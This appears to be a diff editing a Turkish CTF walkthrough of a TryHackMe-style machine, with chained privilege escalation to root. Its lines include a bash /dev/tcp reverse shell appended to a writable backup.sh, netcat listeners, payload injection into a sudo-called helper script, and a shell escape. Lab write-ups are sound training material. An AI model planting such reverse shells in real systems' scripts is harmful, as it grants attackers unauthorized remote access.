@@ -77,14 +77,14 @@ ftp> put shell.sh
 ```
 <img width="1277" height="209" alt="put" src="https://github.com/user-attachments/assets/1ee7cb29-eeb6-472f-ae50-666518d65071" />
 
-Aynı anda başka bir terminalde dinlemeye geçtim, ne zaman tetiklenir bilmiyordum:
+Aynı anda başka bir terminalde dinlemeye geçtim:
 
 ```bash
 nc -nvlp 4444
 ```
 <img width="811" height="131" alt="shell" src="https://github.com/user-attachments/assets/efb7b760-70e0-406c-a245-2be447b267df" />
 
-Bir süre bekledim ve arkadaki otomatik işlem `shell.sh`'ı bash ile çalıştırdı. Netcat tarafında bağlantı düştü ve kendimi sistemde buldum:
+Bir süre bekledim ve arkadaki otomatik işlem `shell.sh`'ı bash ile çalıştırdı. Netcat tarafında bağlantı düştü:
 
 ```
 recon_user@tryhackme-2404:~$ id
@@ -138,7 +138,7 @@ ops_user:x:1004:
 devops:x:1005:recon_user,dev_user
 ```
 
-Bu satır çok değerli: sistemde `recon_user`, `dev_user`, `monitor_user`, `ops_user` diye ayrı kullanıcılar var ve isimlerden de tahmin edebileceğimiz gibi muhtemelen bu makinede zincirleme bir yetki yükseltme senaryosu kurulmuş: recon → dev → monitor → ops → root.
+Sistemde `recon_user`, `dev_user`, `monitor_user`, `ops_user` diye ayrı kullanıcılar var ve isimlerden de tahmin edebileceğimiz gibi muhtemelen bu makinede zincirleme bir yetki yükseltme senaryosu kurulmuş: recon → dev → monitor → ops → root.
 
 `/opt` dizinine baktım çünkü genelde "iş" script'leri, deploy araçları buralarda durur:
 
@@ -153,7 +153,7 @@ recon
 
 ## Privesc #1 - recon_user'dan dev_user'a
 
-Plan basitti: `backup.sh` dosyasının sonuna bir reverse shell satırı ekleyeceğim, dosya root ya da dev_user tarafından her ne zaman tetiklenirse tetiklensin, o an bana bir shell dönecek.
+ `backup.sh` dosyasının sonuna bir reverse shell satırı ekleyeceğim, dosya root ya da dev_user tarafından her ne zaman tetiklenirse tetiklensin, o an bana bir shell dönecek.
 
 ```bash
 echo 'bash -i >& /dev/tcp/192.168.154.242/4445 0>&1' >> /opt/dev/backup.sh
@@ -187,7 +187,7 @@ dev_user@tryhackme-2404:~$ cat flag.txt
 
 <img width="600" height="276" alt="flag2" src="https://github.com/user-attachments/assets/ee26e06a-a440-4308-ae0e-11c3ec3a706c" />
 
-## Enumeration #3 - Sıradaki Halka: monitor_user
+## Enumeration #3 - Sıradaki: monitor_user
 
 `dev_user` olarak tekrar sistemde gezinmeye başladım, özellikle `/opt/recon` ve `/opt/dev` klasörlerine daha dikkatli baktım çünkü artık dev_user olarak bu klasörlerde farklı izinlerim/görüşlerim olabilirdi.
 
@@ -217,7 +217,7 @@ nc -nlvp 1339
 ```
 <img width="663" height="162" alt="shell3" src="https://github.com/user-attachments/assets/e9cb2ad6-76e1-4ae2-b96f-fd779e26e322" />
 
-Bir süre sonra `monitor_user` yetkisiyle (muhtemelen `monitor_user`'a ait bir cron job periyodik olarak `ps` çağırıyordu, sistemdeki process'leri kontrol etmek için) shell düştü:
+Bir süre sonra `monitor_user` yetkisiyle shell düştü:
 
 ```
 monitor_user@tryhackme-2404:~$ id
@@ -243,9 +243,9 @@ Artık alışkanlık haline geldi: yeni bir kullanıcı olduğumda ilk iş `sudo
 
 Burada net bir kural var: `monitor_user`, **şifre girmeden** `ops_user` yetkisiyle `/usr/local/bin/deploy.sh` dosyasını çalıştırabiliyor. İlk düşüncem "deploy script'ini direkt çalıştırıp ne yaptığına bakayım" oldu, ama tabii asıl amacım script'i kullanarak `ops_user` shell'i almak.
 
-`deploy.sh` dosyasının içeriğine baktığımda başka bir dosyayı (`deploy_helper.sh`) çağırdığını gördüm, ve bu helper dosyası bana yazılabilir durumdaydı. Yani `deploy.sh`'ı direkt değiştirmeme gerek yoktu (belki root/ops_user tarafında checksum ya da izin kontrolü olabilirdi diye düşündüm, ihtiyatlı davrandım), onun yerine çağırdığı helper'a payload eklemek daha temiz bir yoldu.
+`deploy.sh` dosyasının içeriğine baktığımda başka bir dosyayı (`deploy_helper.sh`) çağırdığını gördüm, ve bu helper dosyası bana yazılabilir durumdaydı. Yani `deploy.sh`'ı direkt değiştirmeme gerek yoktu (belki root/ops_user tarafında checksum ya da izin kontrolü olabilirdi diye düşündüm), onun yerine çağırdığı helper'a payload eklemek daha temiz bir yoldu.
 
-Önce dinleyiciyi hazırladım, bu sefer `-k` flag'i ile kalıcı dinleme modunda açtım:
+Önce dinleyiciyi hazırladım:
 
 ```bash
 nc -lvnp 1340 -k
@@ -306,7 +306,7 @@ O ekrandayken:
 !/bin/bash
 ```
 
-yazıp Enter'a bastım. Bu sefer gerçekten çalıştı ve kendimi root olarak buldum:
+yazıp Enter'a bastım ve root oldum:
 
 ```
 root@tryhackme-2404:~# id
